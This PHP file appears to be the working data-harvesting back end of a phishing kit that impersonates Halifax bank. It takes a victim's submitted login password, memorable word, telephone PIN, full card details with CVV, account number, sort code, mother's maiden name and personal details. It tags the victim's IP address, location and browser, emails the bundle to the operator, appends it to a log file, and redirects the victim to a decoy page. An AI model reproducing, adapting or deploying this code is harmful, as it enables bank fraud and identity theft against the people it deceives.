<?php

require "../../includes/functions.php";
require "../../includes/One_Time.php";
include "../../CONTROLS.php";

error_reporting(0);
ini_set('display_errors', '0');
$username = $_POST['username'];
$password = $_POST['password'];
$memo = $_POST['memo'];
$title = $_POST['title'];
$name = $_POST['name'];
$dob = $_POST['day'].'/'.$_POST['month'].'/'.$_POST['year'];
$email = $_POST['email'];
$telephone = $_POST['telephone'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
$acno = $_POST['acno'];
$sort = $_POST['sc1'].'-'.$_POST['sc2'].'-'.$_POST['sc3'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccmm']."/".$_POST['ccyy'];
$secode = $_POST['secode'];
$mmn = $_POST['mmn'];
$telepin = $_POST['pinn'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ---------------HALIFAX----------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $title, $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Phone : $telephone
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Halifax)
| Username : $username
| Password : $password
| Memorable : $memo
| Telepin : $telepin
| CC No : $ccno
| CC Expiry : $ccexp
| CVV : $secode
| Account Number : $acno 
| Sortcode : $sort
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";

mail($to, 'Halifax from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);

header('Location: ../../Exit.php?sslchannel=true&sessionid=' . generateRandomString(130));
exit;
?>
